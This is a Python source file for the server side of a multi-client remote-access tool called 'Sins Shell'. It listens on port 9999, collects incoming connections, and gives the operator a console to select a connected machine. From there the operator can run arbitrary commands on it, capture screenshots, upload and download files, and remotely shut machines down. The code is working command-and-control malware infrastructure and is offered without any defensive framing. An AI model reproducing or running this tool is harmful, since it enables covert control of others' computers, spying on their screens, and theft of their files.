
"""
Created on Fri Sep 29 16:14:14 2017

@author: Binish125
"""

import threading
from queue import Queue
import socket 
import os
import datetime

NUMBER_OF_THREADS=2 #number of threads
JOB_NUMBER=[1,2] #thread 1 and thread 2 


queue=Queue()
all_connections=[]
all_addresses=[]


def socket_create():
    try:
        global host
        global port
        global s
        host=""
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("Socket createion error: "+str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\n"+"Retrying...")
        socket_bind()

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address= s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n\n\t\t\tConnection has been established: " + address[0]+"\n")
        except:
            print("\nError while accepting connections")
            
def start_turtle():
    print("\n\n\t\t............... Welcome to the Sins Shell...............\n\n")
    showShellCommands()
    while True:
        cmd=input("Sins>")
        if cmd == ':clear':
            os.system('cls')
            print("\n\n\t\t............... Sins Shell...............\n\n")
        elif cmd == ":help":
            showShellCommands()
        elif cmd == ':list':
            list_connections()
        elif cmd=='':
            pass
        elif 'select' in cmd:
            conn= get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd==':kill':
            for i,conn in enumerate(all_connections):
                conn.send(str.encode("closeConn"))
            pass
        elif cmd==':shut network':
            for i,conn in enumerate(all_connections):
                conn.send(str.encode("shutoff"))
            pass
        else:
            print("\n\tCommand not recognized\n")
 
            
def list_connections():
    results=""
    print("\n\n\tChecking All Connections\n")
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode("checkConn"))
            check=conn.recv(40960)
            print("\n"+all_addresses[i][0]+" Status: "+check.decode('utf-8'))
        except:
            print("\n"+all_addresses[i][0]+" Status: Connection Failed")
            del all_connections[i]
            del all_addresses[i]
            continue 
        results+=str(i) + "    " + str(all_addresses[i][0])+ "    on port :  " + str(all_addresses[i][1])+"\n"
    print(' \n\n..............CLients ............\n' +results+"\n")

def get_target(cmd):
    try:
        target = cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        global ip
        ip=str(all_addresses[target][0])
        os.system('cls')
        print("\n\t\t\tYou are now connected to : "+ str(all_addresses[target][0]))
        showClientCommands()
        print(str("\n"+all_addresses[target][0]) + "> ",end="")
        return conn
    except:
        print("\n\t\tNot a valid selection\n")
        return None
    
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if cmd == ':clear':
                os.system('cls')
                conn.send(str.encode("getCWD"))
                cwd=conn.recv(1024)
                print("\n\t\tYou are connected to : "+ ip)
                print(cwd.decode('utf-8'),end="")
            elif cmd == ':help':
                showClientCommands()
                conn.send(str.encode("getCWD"))
                cwd=conn.recv(1024)
                print(cwd.decode('utf-8'),end="")
            elif cmd == ':kill':
                break
            elif cmd[:4] == ":say":
                try:
                    conn.send(str.encode(cmd))
                except:
                    print("Sorry, message transmission failed")
                cwd=conn.recv(1024)
                print(cwd.decode('utf-8'),end="")
            elif cmd[:11]==":screenshot":
                try:
                    fileN=getDateTime()
                    conn.send(str.encode(cmd))
                    recieveFile(conn,fileN+".png")
                    os.startfile("new_"+fileN+".png")
                except:
                    print("The screenshot capture Failed")
            elif cmd[:6]=='upload':
                try:
                    conn.send(str.encode(cmd))
                    sendFile(conn,cmd[7:])
                except:
                    print("\nFile Could not be uploaded\n")
            elif cmd[:8]=='download':
                try:
                    conn.send(str.encode(cmd))
                    recieveFile(conn,cmd[9:])
                except:
                    print("\nFile Could not be Downloaded\n")
            else:
                if len(str.encode(cmd))>0:
                    conn.send(str.encode(cmd))
                    client_response=str(conn.recv(40960),"utf-8")
                    print(client_response,end="")
        except:
            print("Connection was Lost")
            break

Clientcommands={
        "  :clear":"Clear the shell window                ",
        "  :help":"Display all commands + instruction     ",
        "  :say (message)":"send message                  ",
        "  :screenshot":"Get the Screenshot               ",
        "  download (filename)":"download the file        ",
        "  upload (filename)":"upload the file            ",
        "  :kill":"kill the connection                    ",
         }

Shellcommands={
        "  :clear":"Clear the shell window                ",
        "  :list":"List all connections                   ",
        "  :help":"Display all commands + instruction     ",
        "  :kill":"Kill all connections                   ",
        "  :shut network":"Shut down the entire network   ",
        "  select (computer)":"connect to computer        ",
                  
        }

def getDate():
    now=datetime.datetime.now()
    formate=now.strftime("%Y-%m-%d")
    return(formate)
    
def getTime():
    now=datetime.datetime.now()
    formate=now.strftime("%H-%M-%S")
    return(formate)
    
def getDateTime():
    now=datetime.datetime.now()
    formate=now.strftime("%Y-%m-%d %H-%M-%S")
    return(formate)

def showShellCommands():
    print("\n\t\t|------------------- Sins Commands -------------------|\n")
    for command,inst in Shellcommands.items():
        print("                | "+command+"  -  "+inst+" |")
    print("\n\t\t|-----------------------------------------------------|\n")
    print("\n")
    
    
def showClientCommands():
    print("\n\t\t|------------------ Client Commands ------------------|\n")
    for command,inst in Clientcommands.items():
        print("                | "+command+"  -  "+inst+" |")
    print("\n\t\t|-----------------------------------------------------|\n")
    print("\n")
    
#creating threads    


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon =True #dies when main program ends
        t.start()

def work():
    while True:
        x=queue.get()
        if(x==1):
            socket_create()
            socket_bind()
            accept_connections()
        if(x==2):
            start_turtle()
        queue.task_done()
        
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()    

def sendFile(conn,filename):
    if os.path.isfile(filename):
        ex="exists"
        conn.send(str.encode(ex))
        print("\nfile Existance Confirmed ..\n\n")
        size=str(os.path.getsize(filename))
        conn.send(str.encode(size))
        size=int(size)
        print("Size of File: "+str(os.path.getsize(filename))+"\n")
        decision=input("Upload the File ? (Y/N) ->")
        conn.send(str.encode(decision))
        if(decision=="Y"):
            with open(filename,'rb') as f:
                rate=input("\nRate of Transfer: ")
                conn.send(str.encode(rate))
                rate=int(rate)
                fileBytes=f.read(rate)
                totalSent=len(fileBytes)
                conn.send(fileBytes)
                while size>totalSent:
                    if((totalSent+rate)>size):
                        rate=size-totalSent
                    fileBytes = f.read(rate)
                    conn.send(fileBytes)
                    totalSent+=len(fileBytes)
                    print("{0:.3f}".format((totalSent/float(size))*100)+" % Done")
                print("\n\tFile Upload Successful")
                pass
        else:
            conn.send(str.encode("false"))
            print("\n\tFile Upload Cancelled")
    else:
        conn.send(str.encode("false"))
        print("\n\tNot a File")
    cwd=conn.recv(1024)
    print(cwd.decode('utf-8'),end="")
    
def recieveFile(conn,filename):
    data=conn.recv(1024)
    result=data[5:11].decode('utf-8')
    if(result=="exists"):
        print("\n\nFile Existance Confirmed ..\n")
        filesize=int(data[14:].decode('utf-8'))
        print("Size of the file: "+str(filesize))
        message=input("\n Download the file ? : (Y/N) ->")
        if(message=='Y'):
            conn.send(str.encode("OK"))
            rate=input("\nRate of Transfer: ")
            conn.send(str.encode(rate))
            rate=int(rate)
            f=open("new_"+filename,'wb')
            data=conn.recv(rate)
            totalRecv=len(data)
            f.write(data)
            while totalRecv<filesize:
                if((totalRecv+rate)>filesize):
                    rate=filesize-totalRecv
                data = conn.recv(rate)
                totalRecv+=len(data)
                f.write(data)
                print("{0:.3f}".format((totalRecv/float(filesize))*100)+" % Done")
            print("\nDownload Complete")
            f.close()
        else:
            conn.send(str.encode("cancel"))
            print("\n Download Cancelled")
    else:
        print("File Does not exists")   
    cwd=conn.recv(1024)
    print(cwd.decode('utf-8'),end="")

os.system('cls')
create_workers()
create_jobs()